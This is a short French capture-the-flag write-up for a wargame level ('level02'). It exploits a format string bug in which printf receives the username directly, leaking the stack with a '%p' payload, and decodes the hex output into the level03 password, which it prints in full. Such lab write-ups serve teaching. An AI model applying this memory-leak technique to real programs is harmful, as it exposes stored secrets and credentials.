On constate que le printf a la fin du programme n'est pas correctement utilise. On lui passe directement 'username'.
On peu donc imprimer une partie de la stack. Or sur la stack il est stocke le flag du level03.
En effet ouvre et lit /home/users/level03/.pass et le stock sur la stack.
Le flag est stocke juste avant notre username on va donc pouvoir le detecter facilement.
On print en hexa tout ce que l'on peut trouver sur la stack
python -c "print 'BBBBBBBB' + '%p.'*100"> /tmp/level02 && cat /tmp/level02 | ./level02
On retrouve 0x4242424242424242 qui correspond a notre suite de B et juste avant on devrait trouver le flag.
0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d correspond a 40 characteres, la longueure d'un flag. On est sur la bonne voie.
On traduit l'hexadecimal en characteres ascii puis on converti en big endian. On peut utiliser convToAscii.
0x756e505234376848 -> unPR47hH -> Hh74RPnu
0x45414a3561733951 -> EAJ5as9Q -> Q9sa5JAE
0x377a7143574e6758 -> 7zqCWNgX -> XgNWCqz7
0x354a35686e475873 -> 5J5hnGXs -> sXGnh5J5
0x48336750664b394d -> H3gPfK9M -> M9KfPg3H
On obtient donc ceci.
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
On peut tester avec la commande suivante ou directement avec un 'su level03'.
python -c "print '\n' + 'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'" > /tmp/level02 && cat /tmp/level02 - | ./level02
